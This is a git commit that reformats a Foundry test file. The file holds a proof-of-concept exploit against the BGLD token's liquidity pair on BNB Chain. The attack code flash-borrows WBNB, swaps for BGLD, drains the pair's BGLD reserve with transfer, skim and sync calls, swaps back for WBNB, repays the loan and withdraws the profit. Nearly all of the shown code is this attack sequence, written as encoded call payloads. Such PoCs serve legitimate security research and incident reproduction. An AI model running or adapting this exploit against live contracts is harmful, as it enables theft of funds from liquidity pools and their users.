chore: integrating with vscode

+++ test/poc/20221212_BGLD.t.sol
@@ -5,14 +5,20 @@ import "forge-std/Test.sol";
 import "contract/Arbitrage.sol";
 
 interface IRouter {
-    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
-    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
+    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
+        external
+        pure
+        returns (uint256 amountOut);
+    function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut)
+        external
+        pure
+        returns (uint256 amountIn);
     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
-        uint amountIn,
-        uint amountOutMin,
+        uint256 amountIn,
+        uint256 amountOutMin,
         address[] calldata path,
         address to,
-        uint deadline
+        uint256 deadline
     ) external;
 }
 
@@ -20,7 +26,7 @@ interface IPair {
     function token0() external view returns (address);
     function token1() external view returns (address);
     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
-    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
     function skim(address to) external;
     function sync() external;
 }
@@ -52,14 +58,9 @@ contract BGLDPocTest is Test {
         fee = Fee(2, 4, 4, 10);
     }
 
-    function pancakeCall(
-        address initiator,
-        uint256 /* amount0 */,
-        uint256 amount1,
-        bytes calldata data
-    ) external {
-        require(initiator == address(this), 'Invalid initiator');
-        require(msg.sender == address(lender), 'Invalid lender');
+    function pancakeCall(address initiator, uint256, /* amount0 */ uint256 amount1, bytes calldata data) external {
+        require(initiator == address(this), "Invalid initiator");
+        require(msg.sender == address(lender), "Invalid lender");
 
         address wbnb = lp.token0();
         IERC20(wbnb).transfer(address(arbitrage), amount1);
@@ -68,33 +69,32 @@ contract BGLDPocTest is Test {
 
     function testPocBGLD() public {
         uint256 lend_amount = 125 ether;
-        (uint256 reverse0, uint256 reverse1, ) = lp.getReserves();
+        (uint256 reverse0, uint256 reverse1,) = lp.getReserves();
         address wbnb = lp.token0();
         address bgld = lp.token1();
         bytes[] memory payloads = new bytes[](9);
         // transfer WBNB
-        payloads[0] = abi.encode(wbnb, 0, abi.encodeWithSignature(
-            "transfer(address,uint256)", address(lp), lend_amount
-        ));
+        payloads[0] =
+            abi.encode(wbnb, 0, abi.encodeWithSignature("transfer(address,uint256)", address(lp), lend_amount));
         // swap for BGLD
         uint256 bgld_amount = router.getAmountOut(lend_amount, reverse0, reverse1);
-        payloads[1] = abi.encode(address(lp), 0, abi.encodeWithSignature(
-            "swap(uint256,uint256,address,bytes)", 0, bgld_amount * 100 / (100 + fee.total), address(arbitrage), ""
-        ));
+        payloads[1] = abi.encode(
+            address(lp),
+            0,
+            abi.encodeWithSignature(
+                "swap(uint256,uint256,address,bytes)", 0, bgld_amount * 100 / (100 + fee.total), address(arbitrage), ""
+            )
+        );
         // drain BGLD to 1
         bgld_amount = reverse1 - bgld_amount;
-        payloads[2] = abi.encode(bgld, 0, abi.encodeWithSignature(
-            "transfer(address,uint256)", address(lp), (bgld_amount - 1) * 10
-        ));
-        payloads[3] = abi.encode(address(lp), 0, abi.encodeWithSignature(
-            "skim(address)", address(arbitrage)
-        ));
+        payloads[2] = abi.encode(
+            bgld, 0, abi.encodeWithSignature("transfer(address,uint256)", address(lp), (bgld_amount - 1) * 10)
+        );
+        payloads[3] = abi.encode(address(lp), 0, abi.encodeWithSignature("skim(address)", address(arbitrage)));
         // sync
         payloads[4] = abi.encode(address(lp), 0, abi.encodeWithSignature("sync()"));
         // swap for WBNB
-        payloads[5] = abi.encode(bgld, 0, abi.encodeWithSignature(
-            "approve(address,uint256)", address(router), -1
-        ));
+        payloads[5] = abi.encode(bgld, 0, abi.encodeWithSignature("approve(address,uint256)", address(router), -1));
         address[] memory path = new address[](2);
         path[0] = bgld;
         path[1] = wbnb;
@@ -103,13 +103,22 @@ contract BGLDPocTest is Test {
         uint256 swap_out = wbnb_amount / 1 ether * 1 ether;
         // bgld amount is about single digits, can give a little more
         uint256 swap_in = router.getAmountIn(swap_out, 20, wbnb_amount);
-        payloads[6] = abi.encode(address(router), 0, abi.encodeWithSignature(
-            "swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)",
-            swap_in * (100 + fee.total) / 100, swap_out - 0.1 ether, path, address(arbitrage), block.timestamp
-        ));
+        payloads[6] = abi.encode(
+            address(router),
+            0,
+            abi.encodeWithSignature(
+                "swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)",
+                swap_in * (100 + fee.total) / 100,
+                swap_out - 0.1 ether,
+                path,
+                address(arbitrage),
+                block.timestamp
+            )
+        );
         // repay loan
         uint256 repay_amount = lend_amount + lend_amount * 25 / (10000 - 25) + 1 wei;
-        payloads[7] = abi.encode(wbnb, 0, abi.encodeWithSignature("transfer(address,uint256)", address(lender), repay_amount));
+        payloads[7] =
+            abi.encode(wbnb, 0, abi.encodeWithSignature("transfer(address,uint256)", address(lender), repay_amount));
         // withdraw bnb
         uint256 income_min = swap_out - 0.1 ether - repay_amount;
         payloads[8] = abi.encode(wbnb, 0, abi.encodeWithSignature("withdraw(uint256)", income_min));
